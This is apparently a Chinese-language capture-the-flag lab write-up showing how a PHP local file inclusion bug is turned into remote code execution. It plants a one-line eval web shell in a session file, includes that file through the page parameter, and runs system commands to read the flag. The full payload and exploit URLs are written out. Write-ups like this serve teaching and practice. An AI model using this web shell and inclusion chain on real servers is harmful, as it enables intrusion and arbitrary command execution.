# lab_Hello from Windows_98

1. 這題一開始給了一個輸入的視窗，而點選 Source 之後其實可以直接看到 Source Code，而 Source Code 上方，我們可以控制 seesion 的內容，然後最重要的是可以看到 Source Code 最下面  “<?php include($_GET['page']);?>” ，這邊應該就是我們主要去利用的地方，所以這裡是需要寫一個一句話木馬進去，然後去 include 我們那個 session 的檔案。

![截圖 2022-12-19 上午12.03.45.png](lab_Hello%20from%20Windows_98%20a9f87a1a6dc0456fb0e8dfa69d63bb92/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%258812.03.45.png)

![截圖 2022-12-19 上午12.13.53.png](lab_Hello%20from%20Windows_98%20a9f87a1a6dc0456fb0e8dfa69d63bb92/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%258812.13.53.png)

![截圖 2022-12-19 上午12.09.53.png](lab_Hello%20from%20Windows_98%20a9f87a1a6dc0456fb0e8dfa69d63bb92/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%258812.09.53.png)

1. 接下來我們把這一段 PHP Code “<?php eval($_GET['c']);?>” 放進去執行，從 View → Application 裡面可以看到我們的 cookie ，再把這個 cookie 放進 URL，讓 page = /tmp/sess_27d9ceedb14ff98a7fefec12a95d4a55 ，就可以看到我們的一句話木馬有執行成功。

![截圖 2022-12-19 上午12.32.14.png](lab_Hello%20from%20Windows_98%20a9f87a1a6dc0456fb0e8dfa69d63bb92/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%258812.32.14.png)

![截圖 2022-12-19 上午12.39.53.png](lab_Hello%20from%20Windows_98%20a9f87a1a6dc0456fb0e8dfa69d63bb92/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%258812.39.53.png)

1. 最後就加上 c=system(”<command>”); 可以執行任意指令，嘗試了 c=system(”ls”);  就列出了所有的檔案，然後改成  c=system(”cat flag.txt”); 就成功得到 FLAG。

![截圖 2022-12-19 上午12.52.33.png](lab_Hello%20from%20Windows_98%20a9f87a1a6dc0456fb0e8dfa69d63bb92/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%258812.52.33.png)

![截圖 2022-12-19 上午12.54.31.png](lab_Hello%20from%20Windows_98%20a9f87a1a6dc0456fb0e8dfa69d63bb92/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258A%25E5%258D%258812.54.31.png)

```python
<?php eval($_GET['c']);?>

http://edu-ctf.zoolab.org:10200/?page=/tmp/sess_{cookie}&c=echo%201;
http://edu-ctf.zoolab.org:10200/?page=/tmp/sess_1ab3028b579b1dd8c8e60923df813d85&c=system(%22cat%20flag.txt%22);
FLAG{LFI_t0_rC3_1s_e4Sy!}
```